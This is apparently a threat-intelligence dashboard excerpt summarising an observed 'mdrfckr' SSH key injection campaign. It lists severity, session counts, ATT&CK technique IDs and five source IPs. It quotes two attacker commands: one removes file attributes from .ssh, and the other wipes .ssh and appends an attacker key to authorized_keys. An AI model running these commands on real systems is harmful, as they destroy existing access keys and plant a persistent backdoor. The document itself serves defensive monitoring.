## ⚔️ Attack Campaign Intelligence

| Metric | Value |

| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 19 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa  mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `69.73.187.130`, `180.76.234.93`, `20.153.204.5`, `14.103.103.211`, `218.150.184.241`
